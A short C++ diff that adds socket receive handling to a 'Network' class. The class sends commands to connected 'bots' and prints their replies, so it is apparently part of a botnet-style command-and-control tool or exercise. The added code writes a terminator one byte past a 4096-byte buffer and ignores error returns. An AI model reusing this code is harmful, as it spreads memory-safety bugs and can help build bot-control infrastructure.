@@ -113,14 +113,20 @@ void		Network::ManageClientResponse(std::string command, std::vector<std::string
 void		Network::ManageClientResponse(std::string command)
 {
 	size_t			i;
+	char			buffer[4096];
 
+	bzero(buffer, 4096);
 	for (auto const &[key, val] : this->address_port)
 	{
 		i = send(val, command.c_str(), command.size(), 0);
 		if (i == 0)
 			std::cout << "Bot isn't listening... " << std::endl;
 		else
+		{
 			std::cout << "Send successful " << std::endl;
+			i = recv(val, buffer, 4096, 0);
+			std::cout << "recv : " << buffer << std::endl;
+		}
 	}		
 }
 
@@ -140,7 +146,19 @@ void		Network::SendBuffer(void)
 
 void		Network::RecvBuffer(void)
 {
+	char	recv_buffer[4096];
+	size_t	size;
 
+	for (auto const& port : port_list)
+	{
+		if (FD_ISSET(port, &this->botlist))
+		{
+			size = recv(port, recv_buffer, 4096, 0);
+			recv_buffer[size] = '\0';
+			std::cout << "message: " << recv_buffer << std::endl;
+			bzero(recv_buffer, size);
+		}
+	}
 }
 
 /*
